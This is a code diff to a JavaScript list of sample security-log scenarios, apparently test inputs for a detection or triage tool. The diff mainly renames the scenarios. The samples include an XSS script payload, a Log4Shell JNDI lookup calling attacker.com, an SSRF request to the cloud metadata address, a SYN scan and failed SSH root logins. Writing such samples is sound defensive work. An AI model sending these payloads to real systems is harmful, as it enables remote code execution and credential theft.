@@ -11,33 +11,33 @@ const INPUT_TYPES = [
 const TEST_SCENARIOS = [
   {
     id: 'xss-waf',
-    name: 'XSS Test',
+    name: 'Malicious Link Click',
     type: 'log',
     content: `<134>Mar 24 07:30:01 TWIN ASM: uri="/search?q=<script>alert(document.domain)</script>" request_status="passed" violation_rating="5" staged_sig_names="XSS script tag (URI)" method="GET" response_code="200" ip_client="193.17.57.100"`
   },
   {
     id: 'log4shell',
-    name: 'Log4Shell Test',
+    name: 'Server Exploit',
     type: 'log',
     content: `2026-03-24 10:15:22 ERROR [App] User-Agent: \${jndi:ldap://attacker.com/Exploit}\nException in thread "main" java.lang.NullPointerException`
   },
   {
     id: 'network-scan',
-    name: 'Network SYN',
+    name: 'Network Attack',
     type: 'network',
     content: `10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN\n10.0.0.5 -> 192.168.1.100 TCP SYN`
   },
   {
     id: 'ssrf',
-    name: 'SSRF Test',
+    name: 'Internal Access',
     type: 'log',
     content: `GET /webhook?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: api.internal.corp`
   },
   {
-    id: 'brute',
-    name: 'Brute Force',
+    id: 'bruteforce',
+    name: 'Password Guessing',
     type: 'log',
-    content: `[2026-03-24 09:00:01] failed login for user admin\n[2026-03-24 09:00:02] failed login for user admin\n[2026-03-24 09:00:03] failed login for user admin\n[2026-03-24 09:00:04] failed login for user admin`
+    content: `Failed password for root from 192.168.1.100 port 22\nFailed password for root from 192.168.1.100 port 22\nFailed password for root from 192.168.1.100 port 22`
   }
 ];
 
